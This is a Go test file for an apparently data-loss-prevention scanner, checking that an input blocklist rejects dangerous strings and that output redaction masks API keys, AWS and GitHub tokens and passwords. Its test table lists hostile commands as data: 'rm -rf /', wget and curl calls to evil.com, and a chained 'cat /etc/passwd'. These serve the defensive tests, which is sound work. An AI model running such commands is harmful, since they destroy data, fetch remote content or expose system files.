package scanner

import (
	"os"
	"strings"
	"testing"
)

func TestBasicScanner_DefaultPatterns(t *testing.T) {
	sc := NewBasicScanner()

	// Test input blocking with defaults
	tests := []struct {
		input   string
		blocked bool
	}{
		{"rm -rf /", true},
		{"wget http://evil.com", true},
		{"curl http://evil.com", true},
		{"ls -la; cat /etc/passwd", true},
		{"hello world", false},
		{"read file contents", false},
	}

	for _, tc := range tests {
		valid, reason := sc.ScanInput(tc.input)
		if tc.blocked && valid {
			t.Errorf("Expected input '%s' to be blocked, but it passed", tc.input)
		}
		if !tc.blocked && !valid {
			t.Errorf("Expected input '%s' to pass, but blocked: %s", tc.input, reason)
		}
	}
}

func TestBasicScanner_DefaultOutputRedaction(t *testing.T) {
	sc := NewBasicScanner()

	tests := []struct {
		input    string
		expected string
	}{
		{"Your key is sk-abc123def456ghi", "Your key is [REDACTED]"},
		{"no secrets here", "no secrets here"},
		{"sk-short", "sk-short"}, // Too short to match
	}

	for _, tc := range tests {
		result := sc.ScanOutput(tc.input)
		if result != tc.expected {
			t.Errorf("ScanOutput(%q) = %q, want %q", tc.input, result, tc.expected)
		}
	}
}

func TestBasicScanner_LoadFromJSON(t *testing.T) {
	// Write a temp DLP rules file
	rules := `{
		"input_blocklist": ["DANGER", "EXPLOIT"],
		"output_redact_patterns": ["SECRET-[A-Z0-9]{5,}"],
		"output_redact_replacement": "***HIDDEN***"
	}`

	tmpFile, err := os.CreateTemp("", "dlp_rules_*.json")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpFile.Name())
	tmpFile.WriteString(rules)
	tmpFile.Close()

	sc := NewBasicScannerFromRules(tmpFile.Name())

	// Test custom input blocklist
	valid, _ := sc.ScanInput("this is DANGER zone")
	if valid {
		t.Error("Expected 'DANGER' to be blocked")
	}

	valid, _ = sc.ScanInput("this is safe")
	if !valid {
		t.Error("Expected 'safe' input to pass")
	}

	// Test custom output redaction
	result := sc.ScanOutput("token: SECRET-ABC123DEF")
	if !strings.Contains(result, "***HIDDEN***") {
		t.Errorf("Expected redaction, got: %s", result)
	}

	// Default patterns should NOT work (overridden)
	result = sc.ScanOutput("sk-abc123def456ghi")
	if strings.Contains(result, "[REDACTED]") {
		t.Errorf("Default sk- pattern should be overridden, got: %s", result)
	}
}

func TestBasicScanner_InvalidRulesPath(t *testing.T) {
	// Should fall back to defaults gracefully
	sc := NewBasicScannerFromRules("/nonexistent/path.json")

	valid, _ := sc.ScanInput("rm -rf /")
	if valid {
		t.Error("Expected default blocklist to apply when rules file is missing")
	}
}

func TestBasicScanner_AWSKeyRedaction(t *testing.T) {
	// Test the dlp_rules.json patterns (AWS, GitHub, etc.)
	rules := `{
		"input_blocklist": [],
		"output_redact_patterns": [
			"AKIA[A-Z0-9]{16}",
			"ghp_[a-zA-Z0-9]{36}"
		],
		"output_redact_replacement": "[REDACTED]"
	}`

	tmpFile, err := os.CreateTemp("", "dlp_aws_*.json")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpFile.Name())
	tmpFile.WriteString(rules)
	tmpFile.Close()

	sc := NewBasicScannerFromRules(tmpFile.Name())

	// AWS key
	result := sc.ScanOutput("key: AKIAIOSFODNN7EXAMPLE")
	if !strings.Contains(result, "[REDACTED]") {
		t.Errorf("AWS key not redacted: %s", result)
	}

	// GitHub token
	result = sc.ScanOutput("token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij")
	if !strings.Contains(result, "[REDACTED]") {
		t.Errorf("GitHub token not redacted: %s", result)
	}
}

func TestTokenScanner_ScanStreamWithConfig(t *testing.T) {
	rules := `{
		"input_blocklist": [],
		"output_redact_patterns": ["PASSWORD=[a-zA-Z0-9]+"],
		"output_redact_replacement": "PASSWORD=***"
	}`

	tmpFile, err := os.CreateTemp("", "dlp_stream_*.json")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpFile.Name())
	tmpFile.WriteString(rules)
	tmpFile.Close()

	sc := NewTokenScannerFromRules(tmpFile.Name())

	input := strings.NewReader("config PASSWORD=abc123\nother line\n")
	var output strings.Builder

	err = sc.ScanStream(input, &output)
	if err != nil {
		t.Fatal(err)
	}

	result := output.String()
	if !strings.Contains(result, "PASSWORD=***") {
		t.Errorf("Password not redacted in stream: %s", result)
	}
	if strings.Contains(result, "abc123") {
		t.Errorf("Password value leaked in stream: %s", result)
	}
}
